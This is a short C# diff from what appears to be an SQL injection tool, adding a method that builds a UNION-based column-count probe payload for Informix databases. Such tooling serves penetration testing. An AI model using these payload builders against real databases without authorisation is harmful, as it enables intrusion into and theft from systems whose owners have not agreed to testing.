@@ -59,7 +59,15 @@ namespace SuperSQLInjection.payload
             sb.Append(" from sysibm.sysdummy1");
             return sb.ToString();
         }
-         
+
+        public static String unionColumnCountTestByInformix(String unionTempaldate, String fill)
+        {
+            StringBuilder sb = new StringBuilder(" 1=2 union all select ");
+            sb.Append(unionTempaldate.Replace("{data}", fill));
+            sb.Append(" from sysmaster:sysdual");
+            return sb.ToString();
+        }
+
 
         public static String unionColumnCountTest(int maxColumn, int testIndex, String fill)
         {
